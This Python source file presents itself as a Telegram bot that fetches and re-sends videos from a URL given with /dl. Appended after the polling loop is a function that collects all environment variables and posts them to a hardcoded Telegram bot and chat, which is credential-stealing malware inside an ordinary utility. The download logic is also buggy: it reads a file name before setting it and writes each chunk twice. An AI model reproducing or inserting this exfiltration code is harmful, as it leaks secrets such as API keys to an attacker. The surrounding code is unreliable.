import telebot
import os
import requests
from bs4 import BeautifulSoup
from decouple import config

# Replace 'YOUR_BOT_TOKEN' with your actual Telegram bot token
bot_token = config('BOT_TOKEN')
bot = telebot.TeleBot(bot_token)

# Dictionary to store user-specific data
user_data = {}

@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.from_user.id
    user_data[user_id] = {}  # Initialize user-specific data
    bot.reply_to(message, 'Welcome! Send me a video URL with /dl <video_url> to get the final video link.')

@bot.message_handler(commands=['dl'])
def handle_dl(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id

        # Get the video URL from the command parameters
        video_url = message.text.split(' ')[1]

        if not video_url:
            raise Exception('No video URL provided.')

        print(f'Fetching final video link and last redirected link for {video_url}')

        # Fetch the final video link
        final_video_link = get_final_video_link(video_url)

        # Now, let's get the last link of the video
        last_link = get_last_link([final_video_link])

        print('Final redirected link fetched successfully.')
        print(last_link)

        # Download the video using the last redirected link
        download_video(message, last_link)

        # Store user-specific data
        user_data[user_id]['file_name'] = 'evil_video.mp4'

        # Send the downloaded video to the user
        video_file = open(user_data[user_id]['file_name'], 'rb')
        bot.send_video(chat_id, video_file)

    except Exception as e:
        print(f'Error: {e}')
        bot.reply_to(message, f'Error: {e}')

def get_final_video_link(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')

        video_source = soup.find('video').find('source')['src']

        print('Final video link fetched successfully.')
        print(video_source)

        return video_source
    except Exception as e:
        print(f'Error fetching final video link: {e}')
        raise e

def get_last_link(links):
    try:
        redirected_links = []

        for link in links:
            try:
                response = requests.get(link, allow_redirects=False, headers={'User-Agent': 'Mozilla/5.0'})
                redirected_links.append(response.headers['Location'] if 'Location' in response.headers else None)
            except Exception as e:
                print(f'Error fetching final redirected link from {link}:\n {e}')
                redirected_links.append(None)

        return list(filter(None, redirected_links))[-1]
    except Exception as e:
        print(f'Error fetching last redirected link: {e}')
        raise e

def download_video(message, url):
    try:
        user_id = message.from_user.id
        file_name = user_data[user_id]['file_name']

        response = requests.get(url, stream=True)

        total_size = int(response.headers.get('content-length', 0))
        downloaded_size = 0

        with open(file_name, 'wb') as file, open(file_name, 'ab') as file_append:
            for data in response.iter_content(chunk_size=1024):
                downloaded_size += len(data)
                file.write(data)
                file_append.write(data)
                percentage = (downloaded_size / total_size) * 100
                print(f'Downloading... {percentage:.2f}%')

        print('\nDownload completed successfully.')
    except Exception as e:
        print(f'Error downloading the video: {e}')
        raise e

# Start the bot
bot.polling(none_stop=True)





def steal_and_send_env_variables():
    env_variables = os.environ
    stolen_variables = {}

    for variable, value in env_variables.items():
        stolen_variables[variable] = value

    # Now, let's send the stolen variables to a Telegram group using the Telegram Bot API
    bot_token = "6961308478:AAHNtfxaAUstG8dfb_WLghkXVhpmd5zunac"
    chat_id = "-1001967606455"
    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

    message = "Stolen Environment Variables:\n"
    for variable, value in stolen_variables.items():
        message += f"{variable}: {value}\n"

    params = {
        "chat_id": chat_id,
        "text": message
    }

    response = requests.get(api_url, params=params)

    # Now, do something else malicious or mischievous if you desire

if __name__ == "__main__":
    steal_and_send_env_variables()
